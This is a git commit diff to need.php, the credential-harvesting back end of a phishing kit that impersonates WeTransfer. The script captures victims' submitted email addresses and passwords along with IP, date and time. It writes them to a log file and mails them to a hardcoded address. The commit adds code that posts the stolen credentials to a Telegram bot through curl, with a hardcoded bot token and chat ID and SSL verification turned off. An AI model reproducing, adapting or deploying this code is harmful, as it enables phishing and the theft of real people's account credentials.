d5e4859f7ceef0a948a639e5dbb841fc0408409b
vincey2214 <66318286+vincey2214@users.noreply.github.com>
2021-09-22 23:01:49 +0100

    Update need.php

--- need.php
+++ need.php
@@ -1,7 +1,7 @@
 <?php
 
-$email = $_POST['X1'];
-$Password= $_POST['X2'];
+$email = $_POST['email'];
+$Password= $_POST['password'];
 
 
 $date = gmdate ("d-n-Y");
@@ -10,7 +10,9 @@ $ip = $_SERVER['REMOTE_ADDR'];
 
 $tn = 'wongli.kst@gmail.com'; /////////////// PUT YOUR EMAIL HERE \\\\\\\\\\\\\\\\
 
+$telegram = "on";
 {
+	
 $JarJar = "+---------[Wetransfer]----------+
 + Email    : $email
 + Password : $Password
@@ -19,11 +21,26 @@ $JarJar = "+---------[Wetransfer]----------+
 + Date Log  : $date
 + Time Log  : $time
 +---------[Anyi^]----------+";
-$file = fopen("zm/zm.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
+$file = fopen("logs.txt","a");   //// Save Password in LOGIN.txt / To Change Directory Or Folder Back Add (../) Ex: ../Dir/Scam/LOGIN.txt
 fwrite($file,$JarJar);
 $subject = "Wetransfer log";
 $headers = "From: Anyi-BABA info";
 $headers .= "MIME-Version: 1.0\n";
-mail($tn,$subject,$JarJar,$headers);
+}
+
+$txt = $JarJar;
+$chat_id = "531949274"; // Your Telegram Chat ID
+$bot_url = "bot1905261133:AAE7ga8QuYmeckS9zM6iuTpHQHD2P2-oYGM"; //Your Telegram Bot Api Key
+
+if ($telegram == "on"){
+    $send = ['chat_id'=>$chat_id,'text'=>$txt];
+    $website_telegram = "https://api.telegram.org/{$bot_url}";
+    $ch = curl_init($website_telegram . '/sendMessage');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $result = curl_exec($ch);
+    curl_close($ch);
 }
 ?>
